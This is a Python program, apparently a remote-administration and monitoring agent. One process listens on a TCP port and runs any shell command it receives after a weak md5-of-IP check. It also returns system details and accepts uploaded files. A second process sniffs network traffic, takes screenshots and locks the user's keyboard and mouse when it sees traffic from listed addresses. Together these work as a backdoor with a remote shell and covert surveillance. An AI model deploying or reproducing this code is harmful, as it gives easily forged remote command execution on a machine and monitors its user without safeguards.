from time import sleep
from multiprocessing import Process
from socket import socket, AF_INET, SOCK_STREAM
from psutil import net_if_addrs
from scapy.layers.inet import TCP, IP
from scapy.all import sniff
from PIL.ImageGrab import grab
from subprocess import PIPE, Popen
from base64 import b64decode
from psutil import cpu_freq, cpu_count, users, virtual_memory
from pathlib import Path
from os.path import expanduser
from hashlib import md5
from tkinter import Tk
from pynput import mouse, keyboard

# =============================== Global variables ==================================
server_socket = socket(AF_INET, SOCK_STREAM)

# =============================== Get Ethernet IP Address ===========================
network_adapters = net_if_addrs()

if 'Ethernet' in network_adapters:
    eth0_ip = str(network_adapters['Ethernet'][1].address)

else:
    eth0_ip = '0.0.0.0'


def check_integrity(cmd):
    pre_handshake = md5(str(eth0_ip).encode()).hexdigest()

    if str(cmd).startswith(str(pre_handshake)):
        return True

    else:
        return False


def grab_screenshot():
    image_path = 'Image.png'

    screenshot = grab()
    screenshot.save(image_path)

    return image_path


def execute_commands(client_socket):
    command = client_socket.recv(1024).decode()

    if check_integrity(command):
        index = str(command).find('+')
        result = str(command)[index + len('+'):].strip()

        if str(result) == "info":
            full_info = [cpu_freq(), cpu_count(), virtual_memory(), users()]
            print(full_info)
            full = str(cpu_freq().current) + "+" + str(cpu_count()) + "+" + str(virtual_memory().total)

            process = Popen("whoami", shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            output, error = process.communicate()

            client_socket.sendall(output + error + full.encode())

            client_socket.close()

        elif str(result) == "send":
            file_bytes = client_socket.recv(1024)
            file_size_bytes = client_socket.recv(1024)

            file_name_bytes = b64decode(file_bytes)
            file_sizes = b64decode(file_size_bytes)

            try:
                file_name = file_name_bytes.decode('utf-8')
                file_size = file_sizes.decode('utf-8')

                chunk = int(0.90 * float(file_size))

                documents_path = Path(expanduser("~/Documents"))
                storage_location = documents_path / "RMDownloads" / file_name

                file = open(storage_location, "wb")
                file_bytes = b""

                done = False

                while not done:
                    data = client_socket.recv(chunk)
                    if file_bytes[-5:] == b"<END>":
                        done = True
                        print("Done!")
                        file_bytes = file_bytes[:-5]

                    else:
                        file_bytes += data

                file.write(file_bytes)
                file.close()
                client_socket.close()

            except Exception:
                client_socket.close()

        else:
            # Execute the command on the server and capture the output
            process = Popen(result, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            output, error = process.communicate()

            client_socket.sendall(output + error)
            client_socket.close()

    else:
        client_socket.send("Connection Rejected!".encode())
        raise KeyboardInterrupt


def machine_control(sock):
    port = 63333
    communication_address = (str(eth0_ip), port)
    sock.bind(communication_address)

    try:
        while True:
            sock.listen(10)

            # Accept a client connection
            client_socket, client_address = sock.accept()
            print(f"Connection accepted from: {client_address}")

            execute_commands(client_socket)

    except KeyboardInterrupt:
        # Close the server socket
        sock.close()


def browser_monitor(sock):
    port = 64000

    # while True:
    #     try:
    #         sock = socket(AF_INET, SOCK_STREAM)
    #         communication_address = (str(eth0_ip), port)
    #         sock.connect(communication_address)
    #         break
    #
    #     except ConnectionRefusedError:
    #         print("Connection refused. Retrying in 10 seconds...")
    #         sleep(10)
    #         continue

    forbidden_addresses = ['172.217.170.206', '172.217.170.174']
    print("Connected")

    def forbidden_function():
        mouse_listener = mouse.Listener(suppress=True)
        keyboard_listener = keyboard.Listener(suppress=True)

        root = Tk()
        root.attributes('-fullscreen', True)

        def block_input():
            mouse_listener.start()
            keyboard_listener.start()

        def unblock_input():
            mouse_listener.stop()
            keyboard_listener.stop()
            root.destroy()

        block_input()

        root.after(10000, unblock_input)
        root.mainloop()

    def packet_callback(packet):
        # Filter packets with TCP protocol
        if packet.haslayer(TCP):
            try:
                src_ip = packet[IP].src

                if str(src_ip) in forbidden_addresses:
                    screenshot_path = grab_screenshot()
                    forbidden_function()
                    print("Abnormal activity")
                    sleep(20)

            except IndexError:
                sniff(prn=packet_callback, filter="tcp")

    while True:
        sniff(prn=packet_callback, filter="tcp")


if __name__ == "__main__":
    # Create a Process object for each task
    process1 = Process(target=machine_control, args=(server_socket,))
    process2 = Process(target=browser_monitor, args=(server_socket,))

    # Start the processes
    # process1.start()
    process2.start()
